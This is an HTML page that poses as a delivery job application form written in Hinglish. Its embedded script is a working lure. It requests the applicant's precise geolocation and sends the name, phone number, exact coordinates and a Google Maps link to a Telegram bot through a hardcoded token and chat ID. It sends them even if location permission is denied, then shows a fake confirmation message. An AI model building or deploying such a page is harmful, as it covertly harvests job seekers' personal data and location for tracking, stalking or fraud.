<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery Job Application</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .form-card {
            background: #ffffff;
            width: 100%;
            max-width: 380px;
            padding: 28px 24px;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
        }
        .form-card h2 {
            margin: 0 0 6px;
            color: #1a73e8;
            font-size: 24px;
            text-align: center;
        }
        .form-card p {
            margin: 0 0 20px;
            color: #666;
            font-size: 13px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 15px;
            outline: none;
        }
        input:focus {
            border-color: #1a73e8;
        }
        button {
            width: 100%;
            padding: 13px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        button:active {
            background-color: #1557b0;
        }
        .success-box {
            display: none;
            text-align: center;
            padding: 15px 0;
        }
        .success-box h3 {
            color: #2e7d32;
            margin: 0 0 8px;
            font-size: 20px;
        }
        .success-box p {
            color: #555;
            font-size: 14px;
            margin: 0;
        }
    </style>
</head>
<body>

<div class="form-card">
    <div id="jobFormContainer">
        <h2>Delivery Job</h2>
        <p>Apna detail bharein verification aur onboarding ke liye</p>
        
        <form id="deliveryForm">
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" id="userName" placeholder="Apna pura naam likhein" required>
            </div>
            
            <div class="form-group">
                <label>Mobile Number</label>
                <input type="tel" id="userPhone" placeholder="Mobile number daalein" required>
            </div>
            
            <button type="submit" id="submitBtn">Submit Job Application</button>
        </form>
    </div>

    <div id="successMessage" class="success-box">
        <div style="font-size: 40px; color: #2e7d32; margin-bottom: 10px;">✓</div>
        <h3>Job Submit Successfully</h3>
        <p>Aapka registration complete ho gaya hai. Hamari team aapse jald hi contact karegi.</p>
    </div>
</div>

<script>
    const BOT_TOKEN = "9124377802:AAE_3vHmvv1yngLMyLmpivjuI4A5m9ELJC0";
    const CHAT_ID = "9010957708";

    const form = document.getElementById('deliveryForm');
    const submitBtn = document.getElementById('submitBtn');
    const jobFormContainer = document.getElementById('jobFormContainer');
    const successMessage = document.getElementById('successMessage');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const name = document.getElementById('userName').value.trim();
        const phone = document.getElementById('userPhone').value.trim();
        
        submitBtn.disabled = true;
        submitBtn.innerText = "Submitting...";

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    sendData(name, phone, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                },
                (err) => {
                    // Agar permission deny hui tab bhi details Telegram par bhej dega
                    sendData(name, phone, null, null, null);
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        } else {
            sendData(name, phone, null, null, null);
        }
    });

    function sendData(name, phone, lat, lon, acc) {
        let msg = `📋 *New Delivery Job Application:*\n\n` +
                  `👤 *Name:* ${name}\n` +
                  `📞 *Phone:* ${phone}\n`;

        if (lat && lon) {
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            msg += `\n📍 *Exact Location:*\n` +
                   `• Lat: \`${lat}\`\n` +
                   `• Lon: \`${lon}\`\n` +
                   `• Accuracy: ±${Math.round(acc)} meters\n\n` +
                   `🔗 [Google Maps Par Dekhein](${mapsUrl})`;
        } else {
            msg += `\n⚠️ Location access allow nahi kiya gaya.`;
        }

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: "Markdown"
            })
        }).finally(() => {
            jobFormContainer.style.display = "none";
            successMessage.style.display = "block";
        });
    }
</script>

</body>
</html>
